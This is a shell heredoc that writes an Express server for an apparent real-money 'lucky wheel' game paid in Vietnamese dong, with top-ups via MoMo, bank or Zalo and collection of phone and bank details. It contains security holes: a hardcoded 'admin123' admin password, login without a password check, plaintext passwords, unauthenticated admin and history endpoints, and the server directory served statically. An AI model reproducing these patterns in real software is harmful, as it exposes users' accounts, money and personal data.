cat > server.js << 'EOF'
const express = require("express");
const cors = require("cors");
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

let users = {};
let rechargeRequests = []; // 充值申请记录

const REWARDS = [
  { type: "iphone", name: "iPhone 15", value: 1, weight: 2, rarity: "legendary", icon: "📱" },
  { type: "airpods", name: "AirPods Pro", value: 1, weight: 2, rarity: "legendary", icon: "🎧" },
  { type: "cash", name: "50万越南盾", value: 500000, weight: 8, rarity: "epic", icon: "💰" },
  { type: "cash", name: "30万越南盾", value: 300000, weight: 8, rarity: "epic", icon: "💵" },
  { type: "points", name: "50000积分", value: 50000, weight: 15, rarity: "rare", icon: "⭐" },
  { type: "points", name: "30000积分", value: 30000, weight: 15, rarity: "rare", icon: "✨" },
  { type: "points", name: "10000积分", value: 10000, weight: 25, rarity: "common", icon: "🎫" },
  { type: "points", name: "5000积分", value: 5000, weight: 25, rarity: "common", icon: "🎟️" },
  { type: "none", name: "谢谢参与", value: 0, weight: 5, rarity: "none", icon: "😢" }
];

const TOTAL_WEIGHT = REWARDS.reduce((sum, r) => sum + r.weight, 0);
const SPIN_COST = 30000;

function selectReward() {
  let random = Math.random() * TOTAL_WEIGHT;
  for (let reward of REWARDS) {
    random -= reward.weight;
    if (random <= 0) return reward;
  }
  return REWARDS[REWARDS.length - 1];
}

// 注册/登录
app.post("/register", (req, res) => {
  const { userId, password, phone, bank } = req.body;
  if (!userId || userId.trim() === "") return res.json({ error: "请输入用户名" });
  if (users[userId]) {
    return res.json({
      username: userId,
      points: users[userId].points,
      cash: users[userId].cash,
      spinCount: users[userId].spinCount
    });
  }
  users[userId] = {
    password: password || "default",
    phone: phone || "",
    bank: bank || "",
    points: 100000,
    cash: 0,
    spinCount: 0,
    totalWinnings: 0,
    prizes: [],
    createdAt: new Date()
  };
  res.json({
    username: userId,
    points: users[userId].points,
    cash: users[userId].cash,
    spinCount: users[userId].spinCount
  });
});

// 获取用户信息
app.get("/user/:id", (req, res) => {
  const user = users[req.params.id];
  if (!user) return res.json({ error: "用户不存在" });
  res.json({
    username: req.params.id,
    points: user.points,
    cash: user.cash,
    spinCount: user.spinCount,
    totalWinnings: user.totalWinnings,
    prizes: user.prizes
  });
});

// 抽奖
app.post("/spin", (req, res) => {
  const { userId } = req.body;
  if (!userId || !users[userId]) return res.json({ error: "请先登录" });
  
  const user = users[userId];
  if (user.points < SPIN_COST) return res.json({ error: "积分不足" });
  
  user.points -= SPIN_COST;
  user.spinCount += 1;
  const reward = selectReward();
  
  if (reward.type === "points") {
    user.points += reward.value;
  } else if (reward.type === "cash") {
    user.cash += reward.value;
  } else if (reward.type === "iphone" || reward.type === "airpods") {
    if (!user.prizes) user.prizes = [];
    user.prizes.push({ type: reward.type, name: reward.name, date: new Date() });
  }
  
  user.lastReward = reward;
  res.json({
    user: { username: userId, points: user.points, cash: user.cash, spinCount: user.spinCount },
    reward: { type: reward.type, name: reward.name, value: reward.value, rarity: reward.rarity, icon: reward.icon }
  });
});

// ========== 充值相关接口 ==========

// 1️⃣ 提交充值申请
app.post("/recharge/request", (req, res) => {
  const { userId, amount, method } = req.body;
  
  if (!userId || !users[userId]) {
    return res.json({ error: "请先登录" });
  }
  
  if (!amount || amount < 10000) {
    return res.json({ error: "最低充值 10,000 积分" });
  }
  
  if (!method || !["momo", "bank", "zalo"].includes(method)) {
    return res.json({ error: "充值方式不存在" });
  }
  
  const request = {
    id: Date.now(),
    userId,
    amount,
    method,
    status: "pending", // pending 待审核 / approved 已批准 / rejected 已拒绝
    createdAt: new Date(),
    approvedAt: null,
    approvedBy: null
  };
  
  rechargeRequests.push(request);
  
  res.json({
    success: true,
    message: "✅ 充值申请已提交，请等待客服审核",
    requestId: request.id,
    amount: amount,
    method: method
  });
});

// 2️⃣ 获取充值申请列表（管理后台用）
app.get("/recharge/requests", (req, res) => {
  const pendingRequests = rechargeRequests.filter(r => r.status === "pending");
  res.json({
    total: rechargeRequests.length,
    pending: pendingRequests.length,
    requests: rechargeRequests
  });
});

// 3️⃣ 批准充值申请（管理后台调用）
app.post("/recharge/approve", (req, res) => {
  const { requestId, adminPassword } = req.body;
  
  // 简单的管理员密码验证（生产环境应该用更安全的方式）
  if (adminPassword !== "admin123") {
    return res.json({ error: "管理员密码错误" });
  }
  
  const request = rechargeRequests.find(r => r.id === requestId);
  if (!request) {
    return res.json({ error: "充值申请不存在" });
  }
  
  if (request.status !== "pending") {
    return res.json({ error: "该申请已处理" });
  }
  
  // 批准充值：给用户加积分
  const user = users[request.userId];
  if (!user) {
    return res.json({ error: "用户不存在" });
  }
  
  user.points += request.amount;
  request.status = "approved";
  request.approvedAt = new Date();
  request.approvedBy = "admin";
  
  res.json({
    success: true,
    message: "✅ 充值已批准，用户已收到积分",
    userId: request.userId,
    amount: request.amount,
    userNewPoints: user.points
  });
});

// 4️⃣ 拒绝充值申请
app.post("/recharge/reject", (req, res) => {
  const { requestId, reason, adminPassword } = req.body;
  
  if (adminPassword !== "admin123") {
    return res.json({ error: "管理员密码错误" });
  }
  
  const request = rechargeRequests.find(r => r.id === requestId);
  if (!request) {
    return res.json({ error: "充值申请不存在" });
  }
  
  request.status = "rejected";
  request.rejectReason = reason || "管理员拒绝";
  request.approvedAt = new Date();
  
  res.json({
    success: true,
    message: "✅ 充值申请已拒绝",
    userId: request.userId,
    reason: request.rejectReason
  });
});

// 5️⃣ 直接充值（后台管理员直接给用户加积分）
app.post("/recharge/direct", (req, res) => {
  const { userId, amount, adminPassword, reason } = req.body;
  
  if (adminPassword !== "admin123") {
    return res.json({ error: "管理员密码错误" });
  }
  
  if (!users[userId]) {
    return res.json({ error: "用户不存在" });
  }
  
  users[userId].points += amount;
  
  res.json({
    success: true,
    message: "✅ 已直接充值",
    userId: userId,
    amount: amount,
    userNewPoints: users[userId].points,
    reason: reason || "管理员充值"
  });
});

// 获取用户充值历史
app.get("/recharge/history/:userId", (req, res) => {
  const userRequests = rechargeRequests.filter(r => r.userId === req.params.userId);
  res.json({
    userId: req.params.userId,
    total: userRequests.length,
    history: userRequests
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("\n🎉 ========================================");
  console.log("🎉 幸运转盘服务器启动成功！");
  console.log("🌐 访问地址: http://localhost:" + PORT);
  console.log("💰 充值接口已启用");
  console.log("🎉 ========================================\n");
});
EOF
